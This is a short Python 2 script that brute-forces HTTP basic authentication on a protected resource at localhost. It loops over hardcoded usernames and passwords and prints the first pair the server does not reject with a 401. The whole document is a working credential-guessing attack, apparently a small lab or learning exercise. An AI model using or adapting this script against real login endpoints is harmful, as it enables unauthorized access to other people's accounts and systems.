import base64
import requests

users=['TrustedInstaller', 'Adminastarator']
passwords=['admin590','admin0']
protectedResource = 'http://localhost/secured'

foundPass = False
for user in users:
	if foundPass:
		break
	for passwd in passwords:
		encoded = base64.encodestring(user+':'+passwd)
		response = requests.get(protectedResource, auth=(user,passwd))
		if response.status_code != 401:
			print 'User Found!'
			print 'User: %s, Pass: %s' %(user,passwd)
			foundPass=True
			break
